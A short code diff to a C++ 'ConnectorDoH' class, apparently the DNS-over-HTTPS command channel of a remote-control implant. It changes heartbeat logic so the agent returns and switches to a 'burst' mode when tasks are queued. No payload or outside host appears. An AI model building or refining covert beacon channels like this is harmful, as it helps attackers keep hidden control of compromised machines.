@@ -1233,9 +1233,13 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 				return;
 			}
 			// 有任务，标记 pending 以触发 burst 模式
+			// CRITICAL: 设置 hasPendingTasks 后立即返回，不要在同一个 SendData 中执行 GET
+			// 这样 MainAgent 才能在下一轮循环检查 IsBusy() 并进入 burst 模式
 			this->hasPendingTasks = TRUE;
-			DnsDebugLogf("[DoH] HEARTBEAT: has tasks (IP=%u.%u.%u.%u) -> burst mode", 
+			this->seq++; // 更新 seq，因为心跳已完成
+			DnsDebugLogf("[DoH] HEARTBEAT: has tasks (IP=%u.%u.%u.%u) - return to trigger burst", 
 			             ipBuf[0], ipBuf[1], ipBuf[2], ipBuf[3]);
+			return; // 返回让 MainAgent 检查 IsBusy() 并进入 burst
 		} else {
 			// A-record heartbeat failed; skip TXT this round and retry later.
 			DnsDebugLog("[DoH] HEARTBEAT: A query FAILED");
